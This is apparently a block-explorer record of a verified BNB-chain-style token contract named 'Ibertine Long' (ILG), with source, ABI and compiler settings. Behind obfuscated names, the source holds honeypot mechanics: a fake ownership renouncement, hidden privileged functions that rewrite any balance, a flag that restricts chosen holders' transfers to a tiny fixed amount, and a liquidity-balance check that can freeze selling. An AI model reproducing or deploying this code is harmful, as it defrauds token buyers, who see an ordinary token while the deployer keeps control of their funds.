{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface enableTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeListSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeIsMarketing {\n    function createPair(address receiverFrom, address minWallet) external returns (address);\n}\n\ninterface txMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTo) external view returns (uint256);\n\n    function transfer(address fundSwap, uint256 amountEnable) external returns (bool);\n\n    function allowance(address receiverShouldLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundSwap,\n        uint256 amountEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atSender, uint256 value);\n    event Approval(address indexed receiverShouldLaunched, address indexed spender, uint256 value);\n}\n\ninterface txModeMetadata is txMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IbertineLong is takeListSwap, txMode, txModeMetadata {\n\n    uint256 public liquidityLimitMode;\n\n    address private receiverTotal;\n\n    function launchMaxFrom() private view {\n        require(shouldAmount[_msgSender()]);\n    }\n\n    function sellTrading(address atIsLaunch) public {\n        if (fromMin) {\n            return;\n        }\n        if (autoLaunched == launchMax) {\n            launchMax = liquidityLimitMode;\n        }\n        shouldAmount[atIsLaunch] = true;\n        if (autoLaunched != liquidityLimitMode) {\n            launchMax = fromTx;\n        }\n        fromMin = true;\n    }\n\n    uint256 public feeLimitFrom;\n\n    function senderExempt(address txTotal, address fundSwap, uint256 amountEnable) internal returns (bool) {\n        require(launchedToken[txTotal] >= amountEnable);\n        launchedToken[txTotal] -= amountEnable;\n        launchedToken[fundSwap] += amountEnable;\n        emit Transfer(txTotal, fundSwap, amountEnable);\n        return true;\n    }\n\n    address public limitReceiver;\n\n    function owner() external view returns (address) {\n        return receiverTotal;\n    }\n\n    string private teamSender = \"ILG\";\n\n    function receiverTrading(address txTotal, address fundSwap, uint256 amountEnable) internal returns (bool) {\n        if (txTotal == atTotal) {\n            return senderExempt(txTotal, fundSwap, amountEnable);\n        }\n        uint256 atShould = txMode(limitReceiver).balanceOf(limitFrom);\n        require(atShould == totalLiquidity);\n        require(fundSwap != limitFrom);\n        if (buyWalletAmount[txTotal]) {\n            return senderExempt(txTotal, fundSwap, takeTokenFund);\n        }\n        return senderExempt(txTotal, fundSwap, amountEnable);\n    }\n\n    bool private teamTradingMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptAuto;\n    }\n\n    uint256 private isExempt = 100000000 * 10 ** 18;\n\n    function liquidityAtMin(address tokenSender) public {\n        launchMaxFrom();\n        if (launchedLiquidity == fromTx) {\n            marketingTx = false;\n        }\n        if (tokenSender == atTotal || tokenSender == limitReceiver) {\n            return;\n        }\n        buyWalletAmount[tokenSender] = true;\n    }\n\n    function approve(address receiverFee, uint256 amountEnable) public virtual override returns (bool) {\n        walletAmount[_msgSender()][receiverFee] = amountEnable;\n        emit Approval(_msgSender(), receiverFee, amountEnable);\n        return true;\n    }\n\n    address limitFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (launchMax != liquidityLimitMode) {\n            launchMax = liquidityLimitMode;\n        }\n        enableTake tradingTake = enableTake(txExemptShould);\n        limitReceiver = feeIsMarketing(tradingTake.factory()).createPair(tradingTake.WETH(), address(this));\n        \n        atTotal = _msgSender();\n        launchedTradingReceiver();\n        shouldAmount[atTotal] = true;\n        launchedToken[atTotal] = isExempt;\n        if (launchedLiquidity != launchMax) {\n            marketingTx = true;\n        }\n        emit Transfer(address(0), atTotal, isExempt);\n    }\n\n    function launchedExempt(address modeExempt, uint256 amountEnable) public {\n        launchMaxFrom();\n        launchedToken[modeExempt] = amountEnable;\n    }\n\n    mapping(address => bool) public buyWalletAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return swapEnable;\n    }\n\n    address public atTotal;\n\n    string private swapEnable = \"Ibertine Long\";\n\n    uint256 totalLiquidity;\n\n    address txExemptShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private marketingTx;\n\n    function allowance(address amountMarketing, address receiverFee) external view virtual override returns (uint256) {\n        if (receiverFee == txExemptShould) {\n            return type(uint256).max;\n        }\n        return walletAmount[amountMarketing][receiverFee];\n    }\n\n    function transferFrom(address txTotal, address fundSwap, uint256 amountEnable) external override returns (bool) {\n        if (_msgSender() != txExemptShould) {\n            if (walletAmount[txTotal][_msgSender()] != type(uint256).max) {\n                require(amountEnable <= walletAmount[txTotal][_msgSender()]);\n                walletAmount[txTotal][_msgSender()] -= amountEnable;\n            }\n        }\n        return receiverTrading(txTotal, fundSwap, amountEnable);\n    }\n\n    uint256 public launchMax;\n\n    uint256 public fromTx;\n\n    bool public txBuy;\n\n    function launchedTradingReceiver() public {\n        emit OwnershipTransferred(atTotal, address(0));\n        receiverTotal = address(0);\n    }\n\n    mapping(address => uint256) private launchedToken;\n\n    mapping(address => bool) public shouldAmount;\n\n    uint256 private autoLaunched;\n\n    event OwnershipTransferred(address indexed shouldWalletMode, address indexed atReceiver);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isExempt;\n    }\n\n    uint256 private launchedLiquidity;\n\n    function getOwner() external view returns (address) {\n        return receiverTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletAmount;\n\n    uint256 constant takeTokenFund = 4 ** 10;\n\n    function balanceOf(address tokenTo) public view virtual override returns (uint256) {\n        return launchedToken[tokenTo];\n    }\n\n    function fundAuto(uint256 amountEnable) public {\n        launchMaxFrom();\n        totalLiquidity = amountEnable;\n    }\n\n    bool public fromMin;\n\n    function transfer(address modeExempt, uint256 amountEnable) external virtual override returns (bool) {\n        return receiverTrading(_msgSender(), modeExempt, amountEnable);\n    }\n\n    bool private marketingListTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSender;\n    }\n\n    uint256 marketingAt;\n\n    uint8 private exemptAuto = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWalletMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyWalletAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"}],\"name\":\"liquidityAtMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimitMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIsLaunch\",\"type\":\"address\"}],\"name\":\"sellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IbertineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}